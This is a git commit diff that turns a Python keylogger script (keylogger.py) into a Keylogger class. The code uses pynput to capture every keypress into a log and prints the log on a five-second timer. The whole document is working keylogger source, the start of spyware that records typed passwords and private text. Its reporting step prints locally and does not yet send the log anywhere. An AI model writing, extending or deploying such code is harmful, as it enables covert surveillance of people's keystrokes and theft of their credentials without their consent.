59c3bbcc852e85f30b3ffac3b85e3fd6e69c451f
root <root@localhost.localdomain>
2018-12-04 22:23:05 -0500

    Implemented OOP; New file blogger

--- keylogger.py
+++ keylogger.py
@@ -6,28 +6,28 @@ import threading
 log = ""
 
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + " " + str(key) + " "
+class Keylogger:
+    def process_key_press(self, key):
+        global log
+        try:
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.space:
+                log = log + " "
+            else:
+                log = log + " " + str(key) + " "
+    # end process_key_press
+
+    def report(self):
+        global log
         print(log)
-# end process_key_press
+        log = ""
+        timer = threading.Timer(5, self.report)
+        timer.start()
+    # end report
 
-
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(5, report)
-    timer.start()
-# end report
-
-
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    keyboard_listener.join()
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
